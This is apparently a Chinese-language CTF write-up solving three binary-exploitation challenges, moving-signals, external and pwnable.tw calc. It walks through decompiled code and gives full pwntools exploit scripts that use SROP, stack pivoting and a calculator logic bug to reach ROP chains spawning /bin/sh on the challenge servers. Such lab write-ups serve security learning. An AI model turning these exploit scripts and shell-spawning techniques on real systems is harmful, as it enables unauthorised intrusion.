# Challenges 100 Week 4


# Challenges_100-Week_4

|          Challenges           |      Tricks      |
| :---------------------------: | :--------------: |
| 0x41414141 CTF-moving-signals |      `SROP`      |
|    0x41414141 CTF-external    | `stack pivoting` |
|        pwnable.tw-calc        | `逻辑漏洞`+`ROP` |

<!-- more -->

# moving-signals

## ida

```assembly
mov     rdi, 0          ; Alternative name is '_start'                                       ; __start
mov     rsi, rsp
sub     rsi, 8
mov     rdx, 1F4h
syscall                 ; LINUX - sys_read
retn
endp
pop     rax
retn
```

见过最短的程序了....简单分析发现只能控制`rax`，即`sycall`调用的函数。为了能控制更多的寄存器，想到使用`SROP`。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./moving-signals'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('161.97.176.150',2525)

elf = ELF(binary,checksec=False)
start=0x041000
pop_rax=0x041018
syscall=0x041015
bss=0x041500
shellcode=asm(shellcraft.sh())
#gdb.attach(p)
frame = SigreturnFrame()
frame.rsp=bss
frame.rip=syscall
frame.rax=constants.SYS_read
frame.rdi=0
frame.rsi=bss
frame.rdx=0x50
payload='a'*8+p64(pop_rax)+p64(0xf)+p64(syscall)+str(frame)
p.send(payload)

payload=p64(bss+8)+shellcode
p.sendline(payload)

p.interactive()
```

# external

## ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("ROP me ;)");
  printf("> ");
  read(0, buf, 0xF0uLL);
  clear_got();
  return 0;
}
```

主函数把got表给清除了，着实吓到我了。不过有个系统调用。

```assembly
.text:000000000040127C write_syscall   proc near               ; CODE XREF: timeout+22↑p
.text:000000000040127C ; __unwind {
.text:000000000040127C                 mov     rax, 1
.text:0000000000401283                 syscall 
```

主函数的汇编代码如下：

```assembly
.text:0000000000401224 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000401224                 public main
.text:0000000000401224 main            proc near               ; DATA XREF: _start+21↑o
.text:0000000000401224
.text:0000000000401224 buf             = byte ptr -50h
.text:0000000000401224
.text:0000000000401224 ; __unwind {
.text:0000000000401224                 push    rbp
.text:0000000000401225                 mov     rbp, rsp
.text:0000000000401228                 sub     rsp, 50h
.text:000000000040122C                 lea     rdi, s          ; "ROP me ;)"
.text:0000000000401233                 call    _puts
.text:0000000000401238                 lea     rdi, format     ; "> "
.text:000000000040123F                 mov     eax, 0
.text:0000000000401244                 call    _printf
.text:0000000000401249                 lea     rax, [rbp+buf]
.text:000000000040124D                 mov     edx, 0F0h       ; nbytes
.text:0000000000401252                 mov     rsi, rax        ; buf
.text:0000000000401255                 mov     edi, 0          ; fd
.text:000000000040125A                 call    _read
.text:000000000040125F                 mov     eax, 0
.text:0000000000401264                 call    clear_got
.text:0000000000401269                 mov     eax, 0
.text:000000000040126E                 leave
.text:000000000040126F                 retn
.text:000000000040126F ; } // starts at 401224
.text:000000000040126F main            endp
```

虽然没有了got表，但是我们可以通过bss段的`stdin`进行leak。要做的操作有：

- 控制write参数将`stdin`地址leak
- 控制read参数读取`one_gadget`地址并将其写入到已知地址
- 控制程序执行流，到`one_gadget`

通过write进行leak后，如果想要再次控制rax那么就会进行`leave ret`，进行了栈迁移。这是我们无法控制的，并且我们没有在`fake stack`中布置栈结构。所以我们先进行read，提前布置好栈的结构。然后调用write进行leak。之后因为还要接受`one_gadget`的地址，并将其写入可控地址，同时我们要进行栈的迁移。所以回到`0x40125f`的位置正好帮助我们完成了这个操作。

那么布置的栈结构是什么样的呢？当程序执行到`fake stack`中时，已经完成了，leak与栈迁移，rax也被置为0，这时我们只要调用read，并将`one_gadget`写到read返回之后即可。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./external'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('161.97.176.150',9999)

elf = ELF(binary,checksec=False)

offset = 0x50
write_call=0x040127C
pop_rdi=0x4012f3
pop_rsi=0x4012f1
stdin=0x0404070
fake_stack=0x404078+0x100
syscall=0x401283
leave_ret=0x04011d8
mov_eax=0x00401269
p.recv()
payload='a'*offset+p64(fake_stack)
payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack)+p64(0)+p64(syscall)#read(0,fake_stack,0x38)
payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stdin)+p64(0)+p64(write_call)+p64(mov_eax)#write(1,stdin,0x38)
p.send(payload)
payload='a'*8+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack+56)+p64(0)+p64(syscall)#read(0,fake_stack+56,0x38)

p.send(payload)
sleep(1)
stdin_addr= u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print hex(stdin_addr)

libc=ELF('./libc-2.28.so')
libcbase=stdin_addr-libc.sym["_IO_2_1_stdin_"]
one=libcbase+0x448a3 #0x448a3   0xe5456
p.send(p64(one))

p.interactive()
```

# calc

## checksec

```shell
[*] '/home/niebelungen/Desktop/pwnable.tw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## ida

**main:**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

**calc:**

```c
unsigned int calc()
{
  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(s, 0x400u);
    if ( !get_expr(s, 1024) )
      break;
    init_pool(v1);
    if ( parse_expr((int)s, v1) )
    {
      printf("%d\n", v1[v1[0]]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v3;
}
```

**get_expr:**

```c
int __cdecl get_expr(int a1, int a2)
{
  int v2; // eax
  char v4; // [esp+1Bh] [ebp-Dh] BYREF
  int v5; // [esp+1Ch] [ebp-Ch]

  v5 = 0;
  while ( v5 < a2 && read(0, &v4, 1) != -1 && v4 != 10 )
  {
    if ( v4 == 43 || v4 == 45 || v4 == 42 || v4 == 47 || v4 == 37 || v4 > 47 && v4 <= 57 )
    {
      v2 = v5++;
      *(_BYTE *)(a1 + v2) = v4;
    }
  }
  *(_BYTE *)(v5 + a1) = 0;
  return v5;
}
```

**parse_expr:**

```c
int __cdecl parse_expr(int a1, _DWORD *num)
{
  int v3; // eax
  int v4; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int v6; // [esp+28h] [ebp-80h]
  int v7; // [esp+2Ch] [ebp-7Ch]
  char *s1; // [esp+30h] [ebp-78h]
  int left_num; // [esp+34h] [ebp-74h]
  char s[100]; // [esp+38h] [ebp-70h] BYREF
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  v4 = a1;
  v6 = 0;
  bzero(s, 0x64u);
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)(*(char *)(i + a1) - 48) > 9 )
    {
      v7 = i + a1 - v4;
      s1 = (char *)malloc(v7 + 1);
      memcpy(s1, v4, v7);
      s1[v7] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
      left_num = atoi(s1);
      if ( left_num > 0 )
      {
        v3 = (*num)++;
        num[v3 + 1] = left_num;
      }
      if ( *(_BYTE *)(i + a1) && (unsigned int)(*(char *)(i + 1 + a1) - 48) > 9 )
      {
        puts("expression error!");
        fflush(stdout);
        return 0;
      }
      v4 = i + 1 + a1;
      if ( s[v6] )                              // 判断当前操作符是否为第一个操作符
                                                // 是则继续遍历寻找下一个操作符
                                                // 否则对前面的式子进行计算
      {
        switch ( *(_BYTE *)(i + a1) )
        {
          case '%':
          case '*':
          case '/':
            if ( s[v6] != 43 && s[v6] != 45 )
              goto LABEL_14;
            s[++v6] = *(_BYTE *)(i + a1);
            break;
          case '+':
          case '-':
LABEL_14:
            eval(num, s[v6]);
            s[v6] = *(_BYTE *)(i + a1);
            break;
          default:
            eval(num, s[v6--]);
            break;
        }
      }
      else
      {
        s[v6] = *(_BYTE *)(i + a1);
      }
      if ( !*(_BYTE *)(i + a1) )
        break;
    }
  }
  while ( v6 >= 0 )
    eval(num, s[v6--]);
  return 1;
}
```

**eval:**

```c
_DWORD *__cdecl eval(_DWORD *a1, char a2)
{
  _DWORD *result; // eax

  if ( a2 == '+' )
  {
    a1[*a1 - 1] += a1[*a1];
  }
  else if ( a2 > '+' )
  {
    if ( a2 == '-' )
    {
      a1[*a1 - 1] -= a1[*a1];
    }
    else if ( a2 == '/' )
    {
      a1[*a1 - 1] /= (int)a1[*a1];
    }
  }
  else if ( a2 == '*' )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```

`get_expr`用来获取输入的表达式，`parse_expr`用来进行处理式子。计算器大致的思路就是num数组只接受操作数，如果接收的操作符不是第一个操作符就进行计算。那么就有这样一个漏洞：

```text
输入：+300   这时有一个操作数  *a1=1  *a2='+'  num[1]=300  
num[1-1]+=num[1]  ===>   num[0]=301 
最后--*a1          ===>   num[0]=300
那么v1[v1[0]]      ===>   v1[300]
若输入：+300-100
+300的计算同上
num[0]-=num[1]    ===>   num[300]=num[300]-100
实现了任意地址读写的,调试发现361处对应了返回地址
```

那么我们这样构造栈结构：

```text
361===> |pop_eax_addr	|
362		|0xb			|
363		|pop_edx_addr	|
364		|0				|
365		|pop_ecx_ebx	|
366		|0				|
367		|&('/bin/sh')	|
368		|int_0x80_addr	|
369		|'/bin'			|
370		|'/sh\x00'		|
```

计算栈的地址：

```assembly
.text:08049453                 mov     ebp, esp
.text:08049455                 and     esp, 0FFFFFFF0h
.text:08049458                 sub     esp, 10h
```

main函数中，可知：main_stack_size=ebp&0xFFFFFFF0-0x10

则返回地址到ebp为main函数栈，长度为：index=main_stack_size/4+1

那么字符串的地址为：bin_sh=ebp-(index-8)*4，注意栈的增长方向。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./calc'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10100)

elf = ELF(binary,checksec=False)
ret_addr=0x08049499
pop_eax =0x0805c34b #361   362:11
pop_edx =0x080701aa #363   364:0
pop_ecx =0x080701d1 #365   366:0   367:&(/bin/sh)
int_0x80=0x08049a21 #368   369:'/bin/sh'

gadget=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,0xffffffff,0x08049a21,0x6e69622f,0x0068732f]

p.recv()
for i in range(0,6):
    p.sendline('+'+str(361+i))
    val=int(p.recv())
    offset=int(gadget[i])-val
    if offset>0:
    	p.sendline('+'+str(361+i)+'+'+str(offset))
    else:
        p.sendline('+'+str(361+i)+str(offset))
    result=int(p.recv())
    log.success(str(361+i)+'==>'+hex(result))
          
p.sendline('+360')
stackbase=int(p.recv())
stacksize=stackbase+0x100000000-((stackbase+0x100000000) & 0xFFFFFFF0-16)
bin_sh=stackbase+(8-(24/4+1))*4

p.sendline('+367')
val_367=int(p.recv())
offset=bin_sh-val_367
if offset>0:
	p.sendline('+'+str(367)+'+'+str(offset))
else:
    p.sendline('+'+str(367)+str(offset))
result=int(p.recv())
log.success(str(367)+'==>'+hex(result))    

for i in range(7,10):
    p.sendline('+'+str(361+i))
    val=int(p.recv())
    offset=int(gadget[i])-val
    if offset>0:
    	p.sendline('+'+str(361+i)+'+'+str(offset))
    else:
        p.sendline('+'+str(361+i)+str(offset))
    result=int(p.recv())
    log.success(str(361+i)+'==>'+hex(result))
#gdb.attach(p)
p.sendline('Niebelungen')

p.interactive()
```


